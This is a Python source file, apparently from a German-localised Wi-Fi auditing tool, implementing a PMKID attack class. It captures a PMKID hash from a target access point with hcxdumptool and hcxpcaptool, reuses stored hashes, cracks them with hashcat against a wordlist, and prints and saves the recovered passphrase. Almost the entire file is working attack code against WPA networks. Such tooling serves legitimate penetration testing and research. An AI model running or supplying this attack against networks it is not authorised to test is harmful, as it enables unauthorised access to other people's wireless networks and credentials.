#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re

class AttackPMKID(Attack):

    def __init__(self, target):
        super().__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.keep_capturing = False
        self.timer = None

    def get_existing_pmkid_file(self, bssid):
        '''
        Lädt einen vorhandenen PMKID-Hash aus ./hs/
        Gibt den Dateinamen zurück, falls gefunden, sonst None.
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        file_re = re.compile(r'.*pmkid_.*\.16800')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue

            with open(pmkid_filename, 'r', encoding='utf-8') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None

    def run(self):
        '''
        Führt den PMKID-Angriff durch:
            1) Versucht, einen vorhandenen Hash zu laden.
            2) Falls nicht vorhanden, wird live ein Hash gesammelt.
            3) Versucht, den Hash zu cracken.
        Gibt True zurück, wenn ein PMKID erfasst wurde (unabhängig vom Crack-Erfolg).
        '''
        from ..util.process import Process
        dependencies = [
            Hashcat.dependency_name,
            HcxDumpTool.dependency_name,
            HcxPcapTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]
        if missing_deps:
            Color.pl(f'{{!}} Überspringe PMKID-Angriff, fehlende Tools: {{O}}{", ".join(missing_deps)}{{W}}')
            return False

        pmkid_file = None

        if not Configuration.ignore_old_handshakes:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        f'Geladener {{C}}vorhandener{{W}} PMKID-Hash: {{C}}{pmkid_file}{{W}}\n')

        if pmkid_file is None:
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False  # Kein Hash gefunden.

        # Cracken
        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}Cracken von PMKID abgebrochen{W}')
            self.success = False
            return False

        return True  # Auch wenn nicht geknackt, ist das Capturen eines PMKID 'erfolgreich'

    def capture_pmkid(self):
        '''
        Startet das Sammeln eines PMKID-Hashes über hcxdumptool und hcxpcaptool.
        Gibt den Dateinamen mit dem Hash zurück oder None.
        '''
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        t = Thread(target=self.dumptool_thread)
        t.start()

        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash:
                break
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    f'Warte auf PMKID ({{C}}{self.timer}{{W}})')
            time.sleep(1)

        self.keep_capturing = False
        t.join(timeout=2)

        if not pmkid_hash:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    '{R}Fehlgeschlagen{O}: Kein PMKID gefunden\n')
            Color.pl('')
            return None

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}PMKID erfasst{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)
        return pmkid_file

    def crack_pmkid_file(self, pmkid_file):
        '''
        Versucht, den PMKID-Hash mit Hashcat zu cracken.
        Gibt True zurück, wenn erfolgreich, sonst False.
        '''
        if not Configuration.wordlist:
            Color.pl('\n{!} {O}Kein Crack-Versuch, da keine {R}Wortliste{O} angegeben (nutze {C}--dict{O})')
            return False

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACK',
                f'Cracken des PMKID mit {{C}}{Configuration.wordlist}{{W}} ...\n')
        key = Hashcat.crack_pmkid(pmkid_file)

        if not key:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, '{R}CRACK',
                    '{R}Fehlgeschlagen {O}: Passphrase nicht in der Wortliste.\n')
            return False
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACKED', f'{{C}}Key: {{G}}{key}{{W}}')
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                    pmkid_file, key)
            Color.pl('\n')
            self.crack_result.dump()
            return True

    def dumptool_thread(self):
        '''
        Startet hcxdumptool und läuft, bis self.keep_capturing == False.
        '''
        dumptool = HcxDumpTool(self.target, self.pcapng_file)
        try:
            while self.keep_capturing and dumptool.poll() is None:
                time.sleep(0.5)
        finally:
            dumptool.interrupt()

    def save_pmkid(self, pmkid_hash):
        '''
        Speichert den PMKID-Hash in der hs/-Directory.
        Gibt den Dateinamen zurück.
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub(r'[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = f'pmkid_{essid_safe}_{bssid_safe}_{date}.16800'
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p(f'\n{{+}} Speichere {{C}}PMKID Hash{{W}} unter {{C}}{pmkid_file}{{W}} ')
        with open(pmkid_file, 'w', encoding='utf-8') as pmkid_handle:
            pmkid_handle.write(pmkid_hash + '\n')

        return pmkid_file
